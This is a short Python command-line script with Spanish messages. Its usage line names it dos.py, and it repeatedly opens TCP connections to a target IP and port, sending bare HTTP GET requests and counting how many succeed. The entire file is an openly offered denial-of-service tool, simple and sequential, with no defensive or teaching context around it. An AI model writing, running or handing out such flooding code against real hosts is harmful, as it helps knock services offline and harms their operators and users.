import sys
import socket
import time

def dos(ip, port, requests):
    try:
        start = time.time()
        successful_requests = 0

        for _ in range(requests):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)  # Timeout para evitar bloqueos
                s.connect((ip, port))
                s.sendall(b'GET / HTTP/1.1\r\nHost: ' + ip.encode() + b'\r\n\r\n')
                s.close()
                successful_requests += 1
            except socket.error as e:
                print(f"Error en la solicitud: {e}")

        end = time.time()
        print(f'Se enviaron {successful_requests} solicitudes con éxito de un total de {requests}')
        print(f'Tiempo transcurrido: {end - start:.2f} segundos')
    except Exception as e:
        print(f"Ocurrió un error inesperado: {e}")

if __name__ == '__main__':
    if len(sys.argv) != 4:
        print('Uso: python dos.py <ip> <puerto> <solicitudes>')
        sys.exit(1)

    try:
        ip = sys.argv[1]
        port = int(sys.argv[2])
        requests = int(sys.argv[3])

        if not (1 <= port <= 65535):
            raise ValueError("El puerto debe estar entre 1 y 65535.")
        if requests <= 0:
            raise ValueError("El número de solicitudes debe ser mayor que 0.")

        dos(ip, port, requests)
    except ValueError as e:
        print(f"Error en los argumentos: {e}")
        sys.exit(1)
